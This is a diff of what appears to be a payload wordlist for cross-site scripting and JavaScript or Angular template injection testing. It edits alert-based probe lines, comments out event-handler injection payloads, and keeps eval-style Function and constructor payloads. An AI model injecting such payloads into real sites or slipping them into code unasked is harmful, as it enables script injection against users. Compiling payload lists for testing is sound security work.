@@ -1,6 +1,6 @@
 # Basic Payloads
-2 + 2
-alert('XSS')
+2 + 2; alert(1)
+alert(1)
 console.log('Payload executed')
 
 # XSS Payloads
@@ -13,8 +13,8 @@ toString.constructor('alert("XSS")')()
 Function('alert("XSS")')()
 
 # Event Handler Injection
-onmouseover="alert('XSS')"
-onclick="eval('alert(\'XSS\')')"
+#onmouseover="alert('XSS')"
+#onclick="eval('alert(\'XSS\')')"
 
 # Template Injection (Angular)
 {{ 'XSS' | alert }}
